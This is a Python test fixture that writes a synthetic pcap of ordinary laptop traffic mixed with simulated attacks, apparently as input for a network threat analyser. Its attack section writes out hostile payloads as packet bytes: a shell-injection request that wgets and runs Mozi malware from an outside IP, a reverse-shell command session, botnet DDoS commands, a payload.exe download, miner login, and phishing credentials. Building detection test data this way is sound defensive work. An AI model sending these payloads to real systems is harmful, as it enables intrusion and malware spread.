"""Synthetic capture: ~10 minutes of ordinary laptop traffic with one instance of each attack pattern mixed in
(including content-level threats for the Laya conversation review, and benign content-bearing look-alikes).

Used by the tests and for demos (lpa synth demo.pcap && lpa analyse demo.pcap --replay 20).
Large transfers are written with a short captured length but the real wire length (like a snaplen-limited capture).
"""
import random, socket, struct

from .pcapio import PcapWriter

LAPTOP, GW, LAPTOP_MAC, GW_MAC = "192.168.1.20", "192.168.1.1", "3c:22:fb:10:20:30", "aa:bb:cc:00:11:22"
EVIL_MAC = "de:ad:be:ef:00:01"


def _mac(s):
    return bytes(int(x, 16) for x in s.split(":"))


def _csum(b):
    if len(b) % 2:
        b += b"\0"
    s = sum(struct.unpack(f"!{len(b) // 2}H", b)); s = (s >> 16) + (s & 0xFFFF); s += s >> 16
    return ~s & 0xFFFF


def eth(src, dst, et, payload):
    return _mac(dst) + _mac(src) + struct.pack("!H", et) + payload


def ipv4(src, dst, proto, payload, ttl=64):
    h = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(payload), random.randrange(65536), 0x4000, ttl, proto, 0,
                    socket.inet_aton(src), socket.inet_aton(dst))
    return h[:10] + struct.pack("!H", _csum(h)) + h[12:] + payload


def tcp(sport, dport, flags, payload=b"", seq=1, ack=0):
    return struct.pack("!HHIIBBHHH", sport, dport, seq, ack, 5 << 4, flags, 64240, 0, 0) + payload


def udp(sport, dport, payload):
    return struct.pack("!HHHH", sport, dport, 8 + len(payload), 0) + payload


def icmp(t, code, payload):
    h = struct.pack("!BBHHH", t, code, 0, 1, 1) + payload
    return h[:2] + struct.pack("!H", _csum(h)) + h[4:]


def dns(qname, qtype=1, answers=(), rcode=0, qr=False, tid=None):
    flags = (0x8180 if qr else 0x0100) | rcode
    m = struct.pack("!HHHHHH", tid if tid is not None else random.randrange(65536), flags, 1, len(answers), 0, 0)
    m += b"".join(bytes([len(p)]) + p.encode() for p in qname.split(".")) + b"\0" + struct.pack("!HH", qtype, 1)
    for ip in answers:
        m += b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 300, 4) + socket.inet_aton(ip)
    return m


def client_hello(sni, version=0x0303):
    ext_sni = struct.pack("!HHHBH", 0, len(sni) + 5, len(sni) + 3, 0, len(sni)) + sni.encode()
    exts = ext_sni + struct.pack("!HHH", 10, 4, 2) + b"\x00\x1d" + struct.pack("!HHB", 11, 2, 1) + b"\x00"
    ciphers = b"\x13\x01\x13\x02\xc0\x2b\xc0\x2f"
    body = struct.pack("!H", version) + bytes(32) + b"\x00" + struct.pack("!H", len(ciphers)) + ciphers + b"\x01\x00" + \
        struct.pack("!H", len(exts)) + exts
    hs = b"\x01" + struct.pack("!I", len(body))[1:] + body
    return b"\x16\x03\x01" + struct.pack("!H", len(hs)) + hs


def server_hello(version):
    body = struct.pack("!H", version) + bytes(32) + b"\x00" + b"\x00\x2f" + b"\x00"
    hs = b"\x02" + struct.pack("!I", len(body))[1:] + body
    return b"\x16\x03\x01" + struct.pack("!H", len(hs)) + hs


def arp(op, sha, spa, tha, tpa):
    return struct.pack("!HHBBH", 1, 0x0800, 6, 4, op) + _mac(sha) + socket.inet_aton(spa) + _mac(tha) + socket.inet_aton(tpa)


def dhcp(msgtype, server, yiaddr, router):
    m = struct.pack("!BBBBIHH4s4s4s4s", 2, 1, 6, 0, random.randrange(1 << 32), 0, 0, bytes(4), socket.inet_aton(yiaddr),
                    socket.inet_aton(server), bytes(4)) + _mac(LAPTOP_MAC) + bytes(10) + bytes(192) + b"\x63\x82\x53\x63"
    m += bytes([53, 1, msgtype, 54, 4]) + socket.inet_aton(server) + bytes([3, 4]) + socket.inet_aton(router) + b"\xff"
    return m


def dhcp_request(chaddr, requested, hostname, vendor):
    m = struct.pack("!BBBBIHH4s4s4s4s", 1, 1, 6, 0, random.randrange(1 << 32), 0, 0x8000, bytes(4), bytes(4), bytes(4), bytes(4)) + \
        _mac(chaddr) + bytes(10) + bytes(192) + b"\x63\x82\x53\x63"
    m += bytes([53, 1, 3, 50, 4]) + socket.inet_aton(requested)
    m += bytes([12, len(hostname)]) + hostname.encode() + bytes([60, len(vendor)]) + vendor.encode() + b"\xff"
    return m


def mdns_resp(instance, service):
    def nm(n):
        return b"".join(bytes([len(x)]) + x.encode() for x in n.split(".")) + b"\0"
    rd = nm(instance)
    return struct.pack("!HHHHHH", 0, 0x8400, 0, 1, 0, 0) + nm(service) + struct.pack("!HHIH", 12, 1, 120, len(rd)) + rd


class Gen:
    def __init__(self, seed):
        random.seed(seed); self.pk = []; self.port = 50000

    def eport(self):
        self.port = 50000 + (self.port - 49999) % 15000; return self.port

    def add(self, ts, frame, wirelen=None):
        self.pk.append((ts, frame, wirelen))

    def ip(self, ts, src, dst, proto, l4, smac=None, dmac=None, wirelen=None, ttl=64):
        smac = smac or (LAPTOP_MAC if src == LAPTOP else GW_MAC); dmac = dmac or (GW_MAC if src == LAPTOP else LAPTOP_MAC)
        self.add(ts, eth(smac, dmac, 0x0800, ipv4(src, dst, proto, l4, ttl)), wirelen)

    def dns_pair(self, ts, name, ips, qtype=1, rcode=0, server=GW):
        sp = self.eport(); tid = random.randrange(65536)
        self.ip(ts, LAPTOP, server, 17, udp(sp, 53, dns(name, qtype, tid=tid)))
        self.ip(ts + 0.012, server, LAPTOP, 17, udp(53, sp, dns(name, qtype, ips, rcode, qr=True, tid=tid)))

    def tcp_session(self, ts, dst, dport, first=b"", reply=b"", up=600, down=4000, sni=None, rtt=0.03):
        sp = self.eport()
        self.ip(ts, LAPTOP, dst, 6, tcp(sp, dport, 0x02))
        self.ip(ts + rtt, dst, LAPTOP, 6, tcp(dport, sp, 0x12))
        self.ip(ts + rtt + 0.001, LAPTOP, dst, 6, tcp(sp, dport, 0x10))
        t = ts + rtt + 0.002
        payload = client_hello(sni) if sni else first
        if payload:
            self.ip(t, LAPTOP, dst, 6, tcp(sp, dport, 0x18, payload)); t += rtt
        if reply:
            self.ip(t, dst, LAPTOP, 6, tcp(dport, sp, 0x18, reply)); t += 0.001
        while up > 0:
            n = min(up, 1400); self.ip(t, LAPTOP, dst, 6, tcp(sp, dport, 0x18), wirelen=54 + n); up -= n; t += 0.0005
        while down > 0:
            n = min(down, 1400); self.ip(t, dst, LAPTOP, 6, tcp(dport, sp, 0x18), wirelen=54 + n); down -= n; t += 0.0003
        self.ip(t + 0.01, LAPTOP, dst, 6, tcp(sp, dport, 0x11)); self.ip(t + 0.01 + rtt, dst, LAPTOP, 6, tcp(dport, sp, 0x11))
        return sp


BENIGN = [("www.google.com", "142.250.70.100"), ("outlook.office.com", "52.97.146.2"), ("login.microsoftonline.com", "20.190.151.9"),
          ("github.com", "140.82.112.4"), ("r3---sn-uxaxjvhxbt2u-2nqe.googlevideo.com", "173.194.9.72"),
          ("api.anthropic.com", "160.79.104.10"), ("www.wikipedia.org", "185.15.59.224"), ("update.googleapis.com", "142.250.70.99"),
          ("cdn.jsdelivr.net", "151.101.1.229"), ("slack.com", "34.199.54.80"), ("ntp.ubuntu.com", "185.125.190.57"),
          ("s3.amazonaws.com", "52.216.8.11"), ("edge.microsoft.com", "13.107.21.200"), ("i.ytimg.com", "142.250.70.118")]


def write_demo(path, seed=7, duration=600.0):
    g = Gen(seed); T = 1_790_000_000.0
    # ----- benign background: browsing sessions, DNS, NTP, mDNS, a Microsoft heartbeat, DHCP
    g.add(T + 0.5, eth(GW_MAC, LAPTOP_MAC, 0x0800, ipv4(GW, LAPTOP, 17, udp(67, 68, dhcp(5, GW, LAPTOP, GW)))))
    g.add(T + 1.0, eth(GW_MAC, "ff:ff:ff:ff:ff:ff", 0x0806, arp(1, GW_MAC, GW, "00:00:00:00:00:00", LAPTOP)))
    g.add(T + 1.001, eth(LAPTOP_MAC, GW_MAC, 0x0806, arp(2, LAPTOP_MAC, LAPTOP, GW_MAC, GW)))
    t = T + 2
    while t < T + duration:
        name, ip = random.choice(BENIGN)
        g.dns_pair(t, name, [ip])
        g.tcp_session(t + 0.05, ip, 443, sni=name, up=random.randint(600, 6000), down=random.randint(4000, 400000))
        t += random.expovariate(1 / 1.5)
    t = T + 5
    while t < T + duration:                               # Teams-like heartbeat with realistic jitter
        g.tcp_session(t, "52.113.194.132", 443, sni="teams.microsoft.com", up=900, down=1500); t += random.uniform(40, 80)
    for k in range(int(duration // 64)):
        g.ip(T + 3 + k * 64, LAPTOP, "185.125.190.57", 17, udp(123, 123, bytes(48)))
        g.ip(T + 3.02 + k * 64, "185.125.190.57", LAPTOP, 17, udp(123, 123, bytes(48)))
    for k in range(20):
        g.add(T + 7 + k * 25, eth(LAPTOP_MAC, "01:00:5e:00:00:fb", 0x0800, ipv4(LAPTOP, "224.0.0.251", 17,
              udp(5353, 5353, dns("_googlecast._tcp.local", 12)), 255)))

    # ----- attacks (all after a 3-minute warm-up so volume baselines exist)
    A = T + 200
    # 1 C2 beacon to a Metasploit-style port, no DNS, every 30 s
    for k in range(20):
        g.tcp_session(A + k * 30 + random.uniform(-0.2, 0.2), "185.220.101.4", 4444, first=b"\x00" * 64, reply=b"\x01" * 32, up=180, down=90)
    # 2 HTTPS beacon to a bare IP every 45 s
    for k in range(12):
        g.tcp_session(A + 10 + k * 45 + random.uniform(-0.3, 0.3), "91.92.240.11", 443, first=client_hello("91.92.240.11")[:0] or b"\x16\x03\x01\x00\x05hello",
                      up=300, down=200)
    # 3 port scan of the router
    for k, port in enumerate(range(1, 301)):
        sp = 40000 + k; ts = A + 60 + k * 0.01
        g.ip(ts, LAPTOP, GW, 6, tcp(sp, port, 0x02)); g.ip(ts + 0.001, GW, LAPTOP, 6, tcp(port, sp, 0x14))
    # 4 inbound scan from the internet
    for k, port in enumerate([21, 22, 23, 25, 80, 135, 139, 443, 445, 3389, 5900, 8080]):
        g.ip(A + 90 + k * 0.2, "45.83.64.1", LAPTOP, 6, tcp(33333, port, 0x02), smac=GW_MAC, dmac=LAPTOP_MAC)
    # 5 DNS tunnel (TXT, base32-looking labels)
    alphabet = "abcdefghijklmnopqrstuvwxyz234567"
    for k in range(60):
        label = "".join(random.choice(alphabet) for _ in range(52))
        g.dns_pair(A + 120 + k, f"{label}.x{k % 3}.t.evil-tunnel.xyz", [], qtype=16)
    # 6 DGA: NXDOMAIN burst
    for k in range(20):
        dom = "".join(random.choice("bcdfghjklmnpqrstvwxz") for _ in range(random.randint(12, 16))) + random.choice([".biz", ".info", ".top"])
        g.dns_pair(A + 150 + k * 1.5, dom, [], rcode=3)
    # 7 look-alike phishing domain + password POST over HTTP
    g.dns_pair(A + 190, "paypa1-secure-login.com", ["203.0.113.66"])
    g.tcp_session(A + 190.2, "203.0.113.66", 80, first=b"POST /signin HTTP/1.1\r\nHost: paypa1-secure-login.com\r\nContent-Type: "
                  b"application/x-www-form-urlencoded\r\n\r\nemail=me%40example.com&password=hunter2", reply=b"HTTP/1.1 302 Found\r\n\r\n")
    # 8 HTTP basic auth
    g.dns_pair(A + 200, "example.com", ["93.184.216.34"])
    g.tcp_session(A + 200.1, "93.184.216.34", 80, first=b"GET /admin HTTP/1.1\r\nHost: example.com\r\nAuthorization: Basic "
                  b"YWRtaW46c2VjcmV0\r\nUser-Agent: Mozilla/5.0\r\n\r\n", reply=b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>")
    # 9 FTP login
    sp = g.tcp_session(A + 210, "198.51.100.21", 21, reply=b"220 ftp ready\r\n")
    g.ip(A + 211, LAPTOP, "198.51.100.21", 6, tcp(sp, 21, 0x18, b"USER backup\r\n"))
    g.ip(A + 211.5, LAPTOP, "198.51.100.21", 6, tcp(sp, 21, 0x18, b"PASS s3cr3t!\r\n"))
    # 10 PowerShell pulling an executable from a bare IP
    g.tcp_session(A + 220, "91.92.240.11", 80, first=b"GET /payload.exe HTTP/1.1\r\nHost: 91.92.240.11\r\nUser-Agent: Mozilla/5.0 "
                  b"(Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1\r\n\r\n",
                  reply=b"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: 73802\r\n\r\nMZ\x90\x00\x03\x00", down=73802)
    # 11 ARP spoofing of the gateway
    for k in range(14):
        g.add(A + 240 + k * 0.5, eth(EVIL_MAC, LAPTOP_MAC, 0x0806, arp(2, EVIL_MAC, GW, LAPTOP_MAC, LAPTOP)))
    # 12 rogue DHCP server
    g.add(A + 250, eth("66:66:66:00:00:01", LAPTOP_MAC, 0x0800, ipv4("192.168.1.66", LAPTOP, 17, udp(67, 68, dhcp(2, "192.168.1.66", LAPTOP, "192.168.1.66")))))
    # 13 exfiltration: 150 MB upload to an unknown host
    sp = g.eport(); t0 = A + 270; dst = "104.21.3.7"
    g.ip(t0, LAPTOP, dst, 6, tcp(sp, 443, 0x02)); g.ip(t0 + 0.02, dst, LAPTOP, 6, tcp(443, sp, 0x12))
    for k in range(110000):
        g.ip(t0 + 0.03 + k * 0.0006, LAPTOP, dst, 6, tcp(sp, 443, 0x10), wirelen=1454)
        if k % 50 == 0:
            g.ip(t0 + 0.031 + k * 0.0006, dst, LAPTOP, 6, tcp(443, sp, 0x10))
    # 14 ICMP tunnel
    for k in range(15):
        g.ip(A + 330 + k * 2, LAPTOP, "203.0.113.50", 1, icmp(8, 0, bytes(random.randint(300, 1000))))
    # 15 outdated TLS on a web server + 16 SMB to the internet + 17 LLMNR
    sp = g.tcp_session(A + 340, "198.51.100.7", 443, sni="legacy-portal.example.org", reply=server_hello(0x0301))
    g.ip(A + 345, LAPTOP, "198.51.100.9", 6, tcp(g.eport(), 445, 0x02))
    g.add(A + 350, eth(LAPTOP_MAC, "01:00:5e:00:00:fc", 0x0800, ipv4(LAPTOP, "224.0.0.252", 17, udp(g.eport(), 5355, dns("fileserv", 1)), 1)))

    # ----- threats visible mainly in content (for the Laya conversation review)
    B = T + 420
    # 18 reverse shell: cmd.exe banner + commands, on an innocuous port with no DNS
    sp = g.tcp_session(B, "45.137.21.9", 8081, first=b"Microsoft Windows [Version 10.0.22631.4317]\r\n(c) Microsoft Corporation. "
                       b"All rights reserved.\r\n\r\nC:\\Users\\alice>", reply=b"whoami /priv & net user & ipconfig /all\r\n",
                       up=5200, down=300)
    # 19 IRC botnet channel
    g.tcp_session(B + 20, "194.55.186.30", 6697, first=b"NICK x86|WIN|4f2a\r\nUSER bot 0 * :bot\r\nJOIN #zer0 k3y\r\n",
                  reply=b":srv PRIVMSG #zer0 :!udp 203.0.113.9 80 600\r\n", up=400, down=300)
    # 20 IoT exploit attempt leaving the laptop (e.g. malware spreading)
    g.tcp_session(B + 35, "203.0.113.120", 80, first=b"GET /shell?cd+/tmp;rm+-rf+*;wget+http://45.95.169.3/mozi.m;chmod+777+mozi.m;"
                  b"./mozi.m+jaws HTTP/1.1\r\nHost: 203.0.113.120\r\nUser-Agent: Hello, world\r\n\r\n", reply=b"HTTP/1.1 404 Not Found\r\n\r\n")
    # 21 crypto-miner stratum login
    g.tcp_session(B + 50, "51.15.69.136", 3333, first=b'{"id":1,"method":"login","params":{"login":"48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD","pass":"x","agent":"XMRig/6.21.0"}}\n',
                  reply=b'{"id":1,"jsonrpc":"2.0","result":{"job":{"blob":"0e0e"}}}\n', up=2000, down=8000)
    # 22 compromised camera on the LAN announcing itself (DHCP hostname, SSDP, telnet open)
    cam, cam_mac = "192.168.1.44", "00:12:31:aa:bb:cc"
    g.add(B + 60, eth(cam_mac, "ff:ff:ff:ff:ff:ff", 0x0800, ipv4("0.0.0.0", "255.255.255.255", 17, udp(68, 67,
          dhcp_request(cam_mac, cam, "IPCAM-HI3518E", "udhcp 1.19.4")))))
    g.add(B + 61, eth(cam_mac, "01:00:5e:7f:ff:fa", 0x0800, ipv4(cam, "239.255.255.250", 17, udp(1900, 1900,
          b"NOTIFY * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nSERVER: Linux/2.6.18_pro500 UPnP/1.0 MiniUPnPd/1.0\r\n"
          b"NT: urn:schemas-upnp-org:device:Basic:1\r\nLOCATION: http://192.168.1.44:49152/rootDesc.xml\r\n\r\n"), 4)))
    sp2 = g.eport()
    g.add(B + 62, eth(LAPTOP_MAC, cam_mac, 0x0800, ipv4(LAPTOP, cam, 6, tcp(sp2, 23, 0x02))))
    g.add(B + 62.01, eth(cam_mac, LAPTOP_MAC, 0x0800, ipv4(cam, LAPTOP, 6, tcp(23, sp2, 0x12))))
    g.add(B + 62.05, eth(cam_mac, LAPTOP_MAC, 0x0800, ipv4(cam, LAPTOP, 6, tcp(23, sp2, 0x18, b"\r\n(none) login: "))))
    # benign content-bearing look-alikes: printer on the LAN, plain-HTTP captive-portal check, OS updates
    printer, pmac = "192.168.1.50", "3c:2a:f4:01:02:03"
    g.add(B + 70, eth(pmac, "ff:ff:ff:ff:ff:ff", 0x0800, ipv4("0.0.0.0", "255.255.255.255", 17, udp(68, 67,
          dhcp_request(pmac, printer, "BRW3C2AF4010203", "Brother NC-8300w")))))
    g.add(B + 71, eth(pmac, "01:00:5e:00:00:fb", 0x0800, ipv4(printer, "224.0.0.251", 17, udp(5353, 5353,
          mdns_resp("Brother HL-L2350DW._ipp._tcp.local", "_ipp._tcp.local")), 255)))
    g.dns_pair(B + 80, "www.msftconnecttest.com", ["23.215.0.136"])
    g.tcp_session(B + 80.1, "23.215.0.136", 80, first=b"GET /connecttest.txt HTTP/1.1\r\nHost: www.msftconnecttest.com\r\n"
                  b"User-Agent: Microsoft NCSI\r\n\r\n", reply=b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nMicrosoft Connect Test")
    g.dns_pair(B + 90, "archive.ubuntu.com", ["185.125.190.81"])
    g.tcp_session(B + 90.1, "185.125.190.81", 80, first=b"GET /ubuntu/dists/noble-updates/InRelease HTTP/1.1\r\nHost: archive.ubuntu.com\r\n"
                  b"User-Agent: Debian APT-HTTP/1.3 (2.7.14)\r\n\r\n", reply=b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n-----BEGIN PGP", down=120000)

    g.pk.sort(key=lambda x: x[0])
    with open(path, "wb") as f:
        w = PcapWriter(f)
        for ts, frame, wl in g.pk:
            w.write(ts, frame, wl)
    return len(g.pk)
